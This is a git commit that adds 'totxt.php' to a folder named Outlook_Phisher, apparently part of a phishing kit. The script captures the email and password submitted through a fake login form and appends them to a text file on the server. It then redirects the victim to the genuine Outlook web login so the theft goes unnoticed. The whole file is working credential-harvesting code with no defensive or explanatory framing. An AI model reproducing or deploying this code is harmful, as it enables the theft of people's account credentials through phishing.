946f6982e1fd164938e2b18c645cc5f2d4f742f8
Joel-Horensma <58894372+Joel-Horensma@users.noreply.github.com>
2019-12-21 14:22:18 -0500

    Add files via upload

---
+++ Social/Outlook_Phisher/totxt.php
@@ -0,0 +1,13 @@
+<?php
+$email = $_POST["email"];
+$password = $_POST["password"];
+$text = "/////////////////////
+USERNAME: $email 
+PASSWORD: $password
+/////////////////////"; 
+$file = "/var/www/html/The-Garden-Of-Eden/php/txt/pass.txt";
+$fp = fopen($file, "a") or die("Couldn't open $file for writing!");
+fwrite($fp, $text) or die("Couldn't write values to file!"); 
+fclose($fp);
+?>
+<meta http-equiv="refresh" content="0; url=https://outlook.live.com/owa/" />`
